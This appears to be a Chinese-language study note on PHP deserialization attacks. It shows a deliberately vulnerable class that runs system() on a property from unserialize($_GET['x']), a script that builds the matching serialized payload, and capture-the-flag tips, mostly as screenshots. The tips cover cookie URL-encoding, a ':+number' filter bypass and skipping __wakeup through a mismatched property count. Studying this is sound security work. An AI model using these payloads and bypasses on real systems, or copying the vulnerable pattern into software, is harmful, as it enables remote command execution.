# WEB攻防-PHP反序列化&POP链构造&魔术方法流程&漏洞触发条件&属性修改

## 反序列化简单例子

```
<?php
class B{
    public $cmd='ipconfig';
    public function __destruct(){             //destruct()当对象被销毁时会被自动调用
        system($this->cmd);
    }
}
//函数引用，无对象创建触发魔术方法
unserialize($_GET['x']);
```

创建新php文件，利用serialize反序列化操作

```
<?php
class B
{
    public $cmd = 'ipconfig';
    public function __destruct()
    {
        system($this->cmd);
    }
}
$pop= new B();
echo serialize($pop);
```

执行文件（结果）

O:1:"B":1:{s:3:"cmd";s:8:"ipconfig";}

```
?x=O:1:"B":1:{s:3:"cmd";s:8:"ipconfig";}
```

![image-20260105200547812](images/image-20260105200547812.png)

## ctf考题

### 1

![image-20260105223235869](images/image-20260105223235869.png)

因为需要放到cookie，所以需要url编码

==把需要改的写上去，不改的删掉==

![image-20260105223257333](images/image-20260105223257333.png)

![image-20260105223338257](images/image-20260105223338257.png)

### 2

![image-20260105225534993](images/image-20260105225534993.png)

![image-20260105225619801](images/image-20260105225619801.png)



![image-20260105225517735](images/image-20260105225517735.png)

### 3

替换`:数字`为`：+数字`

![image-20260105230617209](images/image-20260105230617209.png)

### 4__wakeup

**声明的属性数量 ≠ 实际给出的属性数量**（不一致)就会跳过

![image-20260105232615191](images/image-20260105232615191.png)